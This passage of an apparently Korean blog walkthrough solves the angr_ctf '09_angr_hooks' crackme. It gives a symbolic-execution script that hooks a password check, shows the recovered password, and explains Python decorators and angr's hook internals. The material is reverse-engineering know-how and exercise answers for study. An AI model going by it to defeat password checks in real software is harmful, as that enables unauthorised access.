&#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="sol09-py"><a href="#sol09-py" class="headerlink" title="sol09.py"></a>sol09.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> traceback<span class="hljs-keyword">import</span> logging<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  check_equals_called_address = <span class="hljs-number">0x080486B3</span>  instruction_to_skip_length = <span class="hljs-number">5</span>  print(type(project.hook))<span class="hljs-meta">  @project.hook(check_equals_called_address, length=instruction_to_skip_length)</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip_check_equals_</span>(<span class="hljs-params">state</span>):</span>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traceback.format_stack():      print(line.strip())    user_input_buffer_address = <span class="hljs-number">0x0804A054</span>    user_input_buffer_length = <span class="hljs-number">16</span>    user_input_string = state.memory.load(      user_input_buffer_address,       user_input_buffer_length    )        check_against_string = <span class="hljs-string">&apos;XYMKBKUHNIQYNQXE&apos;</span>    state.regs.eax = claripy.If(      user_input_string == check_against_string,       claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>),       claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)    )  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution = solution_state.posix.dumps(sys.stdin.fileno())    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol09.py <span class="hljs-number">09</span>_angr_hooks WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048791</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">09</span>_angr_hooks (<span class="hljs-number">0x8048791</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">776</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048793</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">09</span>_angr_hooks (<span class="hljs-number">0x8048793</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">38</span>,<span class="hljs-number">681</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span><span class="hljs-string">b&apos;ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">09</span>_angr_hooks Enter the password: ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGKGood Job.</code></pre><h2 id="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;-&#xADF8;&#xB9AC;&#xACE0;-hook-&#xC791;&#xB3D9;&#xC6D0;&#xB9AC;"><a href="#&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;-&#xADF8;&#xB9AC;&#xACE0;-hook-&#xC791;&#xB3D9;&#xC6D0;&#xB9AC;" class="headerlink" title="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; @ &#xADF8;&#xB9AC;&#xACE0; hook &#xC791;&#xB3D9;&#xC6D0;&#xB9AC;?"></a>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; @ &#xADF8;&#xB9AC;&#xACE0; hook &#xC791;&#xB3D9;&#xC6D0;&#xB9AC;?</h2><p>&#xC0AC;&#xC2E4; &#xC774;&#xB807;&#xAC8C; &#xBB38;&#xC81C;&#xB294; &#xD480;&#xB838;&#xC9C0;&#xB9CC; &#xC800;&#xB294; &#xC774; &#xD6C4;&#xD0B9;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xB9E4;&#xC6B0; &#xAD81;&#xAE08;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB77C;&#xB294; &#xAC83;&#xB3C4; &#xCF54;&#xB4DC;&#xB97C; &#xBCFC; &#xB54C; &#xC5B4;&#xB834;&#xD48B;&#xC774; &#xC54C;&#xACE0;&#xB9CC; &#xC788;&#xC5C8;&#xC9C0; &#xC81C;&#xB300;&#xB85C;&#xB294; &#xBAB0;&#xB77C;&#xC11C; &#xC774;&#xCC38;&#xC5D0; &#xC880; &#xB354; &#xACF5;&#xBD80;&#xD574; &#xBCF4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;"><a href="#&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;" class="headerlink" title="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;"></a>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;</h3><p>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB294; &#xC544;&#xB798; &#xD568;&#xC218;&#xB97C; <code>wrapping</code>&#xD574;&#xC11C; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C; &#xC790;&#xC2E0;&#xC774; &#xC6D0;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C;&#xB098; &#xCF54;&#xB4DC; &#xAC04;&#xACB0;&#xD654;&#xB97C; &#xC704;&#xD574; &#xB9CE;&#xC774; &#xC4F0;&#xC778;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;&#xB97C; &#xD55C;&#xBC88; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Code:</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decoratorFunctionWithArguments</span>(<span class="hljs-params">arg1, arg2, arg3</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrap</span>(<span class="hljs-params">f</span>):</span>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Inside wrap()&quot;</span>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapped_f</span>(<span class="hljs-params">*args</span>):</span>            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Inside wrapped_f()&quot;</span>            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Decorator arguments:&quot;</span>, arg1, arg2, arg3            f(*args)            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;After f(*args)&quot;</span>        <span class="hljs-keyword">return</span> wrapped_f    <span class="hljs-keyword">return</span> wrap<span class="hljs-meta">@decoratorFunctionWithArguments(&quot;hello&quot;, &quot;world&quot;, 42)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sayHello</span>(<span class="hljs-params">a1, a2, a3, a4</span>):</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;sayHello arguments:&apos;</span>, a1, a2, a3, a4<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;After decoration&quot;</span><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Preparing to call sayHello()&quot;</span>sayHello(<span class="hljs-string">&quot;say&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;argument&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;after first sayHello() call&quot;</span>sayHello(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;different&quot;</span>, <span class="hljs-string">&quot;set of&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;after second sayHello() call&quot;</span></code></pre><p>Output:</p><pre><code class="hljs python">Inside wrap()After decorationPreparing to call sayHello()Inside wrapped_f()Decorator arguments: hello world <span class="hljs-number">42</span>sayHello arguments: say hello argument listAfter f(*args)after first sayHello() callInside wrapped_f()Decorator arguments: hello world <span class="hljs-number">42</span>sayHello arguments: a different set of argumentsAfter f(*args)after second sayHello() call</code></pre><blockquote><p>&#xCD9C;&#xCC98; : <a href="https://www.artima.com/weblogs/viewpost.jsp?thread=240845">Python Decorators II: Decorator Arguments</a></p></blockquote><p>&#xBB38;&#xC81C;&#xC5D0;&#xC11C; <code>hook</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xC608;&#xC2DC;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; @&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xB4A4;&#xC5D0; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; wrap &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xD589;&#xC740; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74;&#xC5D0; <code>sayHello</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xC774; &#xB54C; wrap &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xC774; &#xB418;&#xBA74;&#xC11C; <code>wrapped_f</code> &#xD568;&#xC218;&#xB97C; &#xB9AC;&#xD134;&#xD558;&#xB294;&#xB370;, &#xC774; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB2E4;&#xC2DC; &#xBC1B;&#xC544;&#xC11C; <code>sayHello</code>&#xC5D0; &#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790;&#xB4E4;&#xC774; <code>wrapped_f</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xBA74;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>wrapped_f</code> &#xD568;&#xC218; &#xC548;&#xC5D0;&#xC11C; <code>f(*args)</code>&#xB97C; &#xD1B5;&#xD574; <code>sayHello</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC989; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB294; @ &#xB4A4;&#xC5D0; &#xBD99;&#xC740; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB9AC;&#xD134;&#xB41C; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC1B;&#xC544; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; &#xBC11;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC778;&#xC790;&#xB85C; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xC5D0;&#xC11C; &#xB9AC;&#xD134;&#xBC1B;&#xC740; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB54;&#xAC00; &#xC880; &#xBCF5;&#xC7A1;&#xD558;&#xB124;&#xC694;&#x2026;.</p><pre><code class="hljs python">sayHello(a,b,c,d) -&gt; wrap(sayHello) -&gt; wrapped(a,b,c,d) -&gt; sayHello(a,b,c,d)</code></pre><p>&#xC800;&#xB3C4; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xB294;&#xB370; &#xC880; &#xB354; &#xC790;&#xC138;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC2DC;&#xBA74; &#xB420;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.artima.com/weblogs/viewpost.jsp?thread=240808">Decorators I: Introduction to Python Decorators</a></p><p>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB97C; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xB098;&#xC11C; &#xC81C;&#xAC00; &#xAC00;&#xC7A5; &#xC758;&#xBB38;&#xC774;&#xC5C8;&#xB358; &#xC810;&#xC740; &#xBAA8;&#xB4E0; &#xC608;&#xC2DC;&#xC5D0;&#xC11C;&#xB294; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; &#xC544;&#xB798; &#xC120;&#xC5B8;&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xD638;&#xCD9C;&#xC774; &#xB418;&#xB294;&#xB370;, &#xC65C; &#xC194;&#xB8E8;&#xC158; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD638;&#xCD9C;&#xC774; &#xC548;&#xB410;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xC798; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xAC00;? &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; angr &#xCF54;&#xB4DC;&#xB97C; &#xC880; &#xC0B4;&#xD3B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook</span>(<span class="hljs-params">self, addr, hook=None, length=<span class="hljs-number">0</span>, kwargs=None, replace=False</span>):</span>        <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">        Hook a section of code with a custom function. This is used internally to provide symbolic</span><span class="hljs-string">        summaries of library functions, and can be used to instrument execution or to modify</span><span class="hljs-string">        control flow.</span><span class="hljs-string"></span><span class="hljs-string">        When hook is not specified, it returns a function decorator that allows easy hooking.</span><span class="hljs-string">        Usage::</span><span class="hljs-string"></span><span class="hljs-string">            # Assuming proj is an instance of angr.Project, we will add a custom hook at the entry</span><span class="hljs-string">            # point of the project.</span><span class="hljs-string">            @proj.hook(proj.entry)</span><span class="hljs-string">            def my_hook(state):</span><span class="hljs-string">                print(&quot;Welcome to execution!&quot;)</span><span class="hljs-string"></span><span class="hljs-string">        :param addr:        The address to hook.</span><span class="hljs-string">        :param hook:        A :class:`angr.project.Hook` describing a procedure to run at the</span><span class="hljs-string">                            given address. You may also pass in a SimProcedure class or a function</span><span class="hljs-string">                            directly and it will be wrapped in a Hook object for you.</span><span class="hljs-string">        :param length:      If you provide a function for the hook, this is the number of bytes</span><span class="hljs-string">                            that will be skipped by executing the hook by default.</span><span class="hljs-string">        :param kwargs:      If you provide a SimProcedure for the hook, these are the keyword</span><span class="hljs-string">                            arguments that will be passed to the procedure&apos;s `run` method</span><span class="hljs-string">                            eventually.</span><span class="hljs-string">        :param replace:     Control the behavior on finding that the address is already hooked. If</span><span class="hljs-string">                            true, silently replace the hook. If false (default), warn and do not</span><span class="hljs-string">                            replace the hook. If none, warn and replace the hook.</span><span class="hljs-string">        &quot;&quot;&quot;</span>        <span class="hljs-keyword">if</span> hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            <span class="hljs-comment"># if we haven&apos;t been passed a thing to hook with, assume we&apos;re being used as a decorator</span>            <span class="hljs-keyword">return</span> self._hook_decorator(addr, length=length, kwargs=kwargs)        <span class="hljs-keyword">if</span> kwargs <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: kwargs = {}        l.debug(<span class="hljs-string">&apos;hooking %s with %s&apos;</span>, self._addr_to_str(addr), str(hook))        <span class="hljs-keyword">if</span> self.is_hooked(addr):            <span class="hljs-keyword">if</span> replace <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:                <span class="hljs-keyword">pass</span>            <span class="hljs-keyword">elif</span> replace <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:                l.warning(<span class="hljs-string">&quot;Address is already hooked, during hook(%s, %s). Not re-hooking.&quot;</span>, self._addr_to_str(addr), hook)                <span class="hljs-keyword">return</span>            <span class="hljs-keyword">else</span>:                l.warning(<span class="hljs-string">&quot;Address is already hooked, during hook(%s, %s). Re-hooking.&quot;</span>, self._addr_to_str(addr), hook)        <span class="hljs-keyword">if</span> isinstance(hook, type):            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Please instanciate your SimProcedure before hooking with it&quot;</span>)        <span class="hljs-keyword">if</span> callable(hook):            hook = SIM_PROCEDURES[<span class="hljs-string">&apos;stubs&apos;</span>][<span class="hljs-string">&apos;UserHook&apos;</span>](user_func=hook, length=length, **kwargs)        self._sim_procedures[addr] = hook</code></pre><p><code>hook</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xBA3C;&#xC800; &#xC778;&#xC790; <code>hook</code>&#xC774; <code>None</code>&#xC774;&#xBA74; <code>_hook_decorator</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_hook_decorator</span>(<span class="hljs-params">self, addr, length=<span class="hljs-number">0</span>, kwargs=None</span>):</span>        <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">        Return a function decorator that allows easy hooking. Please refer to hook() for its usage.</span><span class="hljs-string"></span><span class="hljs-string">        :return: The function decorator.</span><span class="hljs-string">        &quot;&quot;&quot;</span>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_decorator</span>(<span class="hljs-params">func</span>):</span>            self.hook(addr, func, length=length, kwargs=kwargs)            <span class="hljs-keyword">return</span> func        <span class="hljs-keyword">return</span> hook_decorator    <span class="hljs-comment">#</span>    <span class="hljs-comment"># Pickling</span>    <span class="hljs-comment">#</span></code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C; &#xBCF8; <code>wrap</code> &#xD568;&#xC218;&#xAC00; &#xC548;&#xC5D0; &#xB4E4;&#xC5B4; &#xC788;&#xB294;&#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC548;&#xC5D0;&#xC11C; &#xC120;&#xC5B8;&#xD55C; <code>hook_decorator</code> &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>hook_decorator</code> &#xD568;&#xC218;&#xAC00; &#xBD88;&#xB9AC;&#xBA74; &#xB2E4;&#xC2DC; <code>hook</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C;&#xB294; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; &#xC544;&#xB798; &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB3C4; &#xAC19;&#xC774; &#xC804;&#xB2EC;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; <code>hook</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>SIM_PROCEDURES[&apos;stubs&apos;][&apos;UserHook&apos;](user_func=hook, length=length, **kwargs)</code>&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xACE0;&#xC694;. &#xD760; &#xC77C;&#xB2E8; &#xB370;&#xCF54;&#xB808;&#xC774;&#xC158; &#xD3EC;&#xB9F7;?&#xC5D0; &#xB9DE;&#xCDB0; &#xC81C;&#xC791;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC740; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; skip<em>check_equals</em> &#xD568;&#xC218;&#xB294; &#xC5B4;&#xB514;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB0D0;&#xACE0;!!! </p><p>&#xC77C;&#xB2E8; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBD10;&#xC57C;&#xD560;&#xAC70; &#xAC19;&#xC544;&#xC11C; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traceback.format_stack():      print(line.strip())</code></pre><pre><code class="hljs python">File <span class="hljs-string">&quot;scaffold09.py&quot;</span>, line <span class="hljs-number">99</span>, <span class="hljs-keyword">in</span> &lt;module&gt;    main(sys.argv)File <span class="hljs-string">&quot;scaffold09.py&quot;</span>, line <span class="hljs-number">86</span>, <span class="hljs-keyword">in</span> main    simulation.explore(find=is_successful, avoid=should_abort)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">250</span>, <span class="hljs-keyword">in</span> explore    self.run(stash=stash, n=n, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">280</span>, <span class="hljs-keyword">in</span> run    self.step(stash=stash, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/misc/hookset.py&quot;</span>, line <span class="hljs-number">75</span>, <span class="hljs-keyword">in</span> __call__    result = current_hook(self.func.__self__, *args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/exploration_techniques/explorer.py&quot;</span>, line <span class="hljs-number">96</span>, <span class="hljs-keyword">in</span> step    <span class="hljs-keyword">return</span> simgr.step(stash=stash, extra_stop_points=base_extra_stop_points | self._extra_stop_points, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/misc/hookset.py&quot;</span>, line <span class="hljs-number">80</span>, <span class="hljs-keyword">in</span> __call__    <span class="hljs-keyword">return</span> self.func(*args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">365</span>, <span class="hljs-keyword">in</span> step    successors = self.step_state(state, successor_func=successor_func, **run_args)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">402</span>, <span class="hljs-keyword">in</span> step_state    successors = self.successors(state, successor_func=successor_func, **run_args)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">441</span>, <span class="hljs-keyword">in</span> successors    <span class="hljs-keyword">return</span> self._project.factory.successors(state, **run_args)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/factory.py&quot;</span>, line <span class="hljs-number">60</span>, <span class="hljs-keyword">in</span> successors    <span class="hljs-keyword">return</span> self.default_engine.process(*args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/vex/light/slicing.py&quot;</span>, line <span class="hljs-number">19</span>, <span class="hljs-keyword">in</span> process    <span class="hljs-keyword">return</span> super().process(*args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/engine.py&quot;</span>, line <span class="hljs-number">149</span>, <span class="hljs-keyword">in</span> process    self.process_successors(self.successors, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/failure.py&quot;</span>, line <span class="hljs-number">21</span>, <span class="hljs-keyword">in</span> process_successors    <span class="hljs-keyword">return</span> super().process_successors(successors, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/syscall.py&quot;</span>, line <span class="hljs-number">18</span>, <span class="hljs-keyword">in</span> process_successors    <span class="hljs-keyword">return</span> super().process_successors(successors, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/hook.py&quot;</span>, line <span class="hljs-number">61</span>, <span class="hljs-keyword">in</span> process_successors    <span class="hljs-keyword">return</span> self.process_procedure(state, successors, procedure, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/procedure.py&quot;</span>, line <span class="hljs-number">37</span>, <span class="hljs-keyword">in</span> process_procedure    inst = procedure.execute(state, successors, ret_to=ret_to, 